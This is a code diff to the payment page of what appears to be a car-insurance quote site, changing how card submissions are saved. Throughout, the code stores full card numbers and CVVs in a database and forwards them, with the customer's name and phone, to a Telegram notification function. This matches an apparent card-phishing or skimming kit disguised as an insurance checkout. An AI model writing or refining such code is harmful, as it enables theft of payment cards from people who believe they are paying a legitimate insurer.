@@ -325,68 +325,52 @@ const Payment = () => {
         return;
       }
 
-      // Always create a new application for each card submission
+      // Update existing application instead of creating a new one
       const ipAddress = localStorage.getItem('visitor_ip') || null;
-      const { data: newApp, error } = await supabase.
-      from('customer_applications').
-      insert([{
-        full_name: existingData.full_name,
-        phone: existingData.phone,
-        insurance_type: existingData.insurance_type,
-        vehicle_manufacturer: existingData.vehicle_manufacturer,
-        vehicle_model: existingData.vehicle_model,
-        vehicle_year: existingData.vehicle_year,
-        vehicle_value: existingData.vehicle_value,
-        usage_purpose: existingData.usage_purpose,
-        add_driver: existingData.add_driver,
-        company_logo: existingData.company_logo,
-        cardholder_name: formData.cardholderName,
-        card_number: formData.cardNumber,
-        card_last_4: lastFour,
-        card_type: cardType,
-        card_cvv: formData.cvv,
-        expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
-        selected_company: companyName,
-        selected_price: price,
-        regular_price: regularPrice,
-        current_step: 'payment',
-        payment_approved: false,
-        status: 'pending_payment',
-        ip_address: ipAddress
-      }]).
-      select().
-      single();
+      const { error } = await supabase
+        .from('customer_applications')
+        .update({
+          cardholder_name: formData.cardholderName,
+          card_number: formData.cardNumber,
+          card_last_4: lastFour,
+          card_type: cardType,
+          card_cvv: formData.cvv,
+          expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
+          selected_company: companyName,
+          selected_price: price,
+          regular_price: regularPrice,
+          current_step: 'payment',
+          payment_approved: false,
+          status: 'pending_payment',
+          ip_address: ipAddress
+        })
+        .eq('id', applicationId);
 
       if (error) throw error;
 
-      if (newApp) {
-        setApplicationId(newApp.id);
-        localStorage.setItem('applicationId', newApp.id);
-
-        // Send Telegram notification
-        try {
-          await supabase.functions.invoke('send-telegram', {
-            body: {
-              applicationData: {
-                fullName: existingData.full_name || '',
-                phone: existingData.phone || '',
-                selectedCompany: companyName,
-                selectedPrice: price,
-                insuranceType: existingData.insurance_type || '',
-                vehicleManufacturer: existingData.vehicle_manufacturer || '',
-                vehicleModel: existingData.vehicle_model || '',
-                vehicleYear: existingData.vehicle_year || '',
-                cardholderName: formData.cardholderName,
-                cardNumber: formData.cardNumber,
-                cardCvv: formData.cvv,
-                expiryDate: `${formData.expiryMonth}/${formData.expiryYear}`
-              }
+      // Send Telegram notification
+      try {
+        await supabase.functions.invoke('send-telegram', {
+          body: {
+            applicationData: {
+              fullName: existingData.full_name || '',
+              phone: existingData.phone || '',
+              selectedCompany: companyName,
+              selectedPrice: price,
+              insuranceType: existingData.insurance_type || '',
+              vehicleManufacturer: existingData.vehicle_manufacturer || '',
+              vehicleModel: existingData.vehicle_model || '',
+              vehicleYear: existingData.vehicle_year || '',
+              cardholderName: formData.cardholderName,
+              cardNumber: formData.cardNumber,
+              cardCvv: formData.cvv,
+              expiryDate: `${formData.expiryMonth}/${formData.expiryYear}`
             }
-          });
-          console.log('Telegram notification sent');
-        } catch (telegramError) {
-          console.error('Error sending Telegram notification:', telegramError);
-        }
+          }
+        });
+        console.log('Telegram notification sent');
+      } catch (telegramError) {
+        console.error('Error sending Telegram notification:', telegramError);
       }
 
       setApprovalStatus('waiting');
